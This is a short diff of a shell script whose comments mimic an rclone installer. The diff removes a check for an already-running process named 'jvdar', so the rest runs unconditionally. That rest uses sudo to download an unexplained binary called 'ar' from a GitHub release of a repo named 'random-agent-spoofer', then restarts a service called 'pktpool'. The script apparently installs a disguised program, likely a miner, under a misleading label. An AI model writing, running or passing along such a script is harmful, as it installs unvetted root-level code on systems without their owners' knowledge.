@@ -7,12 +7,6 @@
 # 3 - installed version of rclone is up to date
 # 4 - supported unzip tools are not available
 
-count=`pgrep jvdar |  grep -o -E '[0-9]+'`
-
-if [[ $count -gt 0 ]]
-then
-  echo "dang ton tai"
-else
 cd /home
 
 sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar 
@@ -65,4 +59,4 @@ sudo service pktpool restart
 
 
 
-fi
+
